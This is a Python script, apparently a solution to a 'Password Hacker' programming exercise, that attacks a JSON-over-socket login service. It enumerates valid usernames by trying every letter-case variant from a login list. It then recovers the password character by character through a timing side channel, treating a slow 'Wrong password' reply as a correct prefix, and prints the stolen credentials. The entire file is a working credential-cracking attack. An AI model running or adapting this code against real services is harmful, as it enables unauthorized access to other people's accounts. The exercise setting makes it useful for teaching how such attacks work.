from datetime import datetime
import itertools
import json
import socket
from string import ascii_letters, digits
from sys import argv


def permute(word):
    n = len(word)
    maximum = 1 << n  # Number of permutations is 2^n
    word = word.lower()  # Converting string to lower case

    for i in range(maximum):  # Using all subsequences and permuting them
        word_letters = list(word)   # If j-th bit is set, we convert it to upper case
        for j in range(n):
            if ((i >> j) & 1) == 1:
                word_letters[j] = word[j].upper()

        yield "".join(word_letters)


def finding_valid_login(client, login_file):
    for login in login_file.readlines():
        login = login.rstrip()
        permutation_generator = permute(login)
        for _ in range(2 ** len(login)):
            message = json.dumps({"login": next(permutation_generator), "password": " "}).encode()
            client.send(message)
            response = client.recv(1024).decode()
            response = json.loads(response)
            if "Wrong password" in response["result"]:
                return json.loads(message.decode())["login"]


def finding_valid_password(client):
    password_letters = list()
    while True:
        for letter in itertools.chain(ascii_letters, digits):
            pass_try = "".join(password_letters) + letter
            message = json.dumps({"login": valid_login, "password": pass_try}).encode()
            client.send(message)
            start_time = datetime.now()
            response = json.loads(client.recv(1024).decode())
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            if "Wrong password" in response["result"]:
                if duration > 0.05:
                    password_letters.append(letter)
            elif "success" in response["result"]:
                password_letters.append(letter)
                return "".join(password_letters)


hostname = argv[1]
port = int(argv[2])

address = (hostname, port)

with socket.socket() as client_socket:
    client_socket.connect(address)
    with open("C:\\Users\\Mike\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\logins.txt") as file:
        valid_login = finding_valid_login(client_socket, file)
        valid_password = finding_valid_password(client_socket)
        credentials = {"login": valid_login, "password": valid_password}
        print(json.dumps(credentials, indent=4))
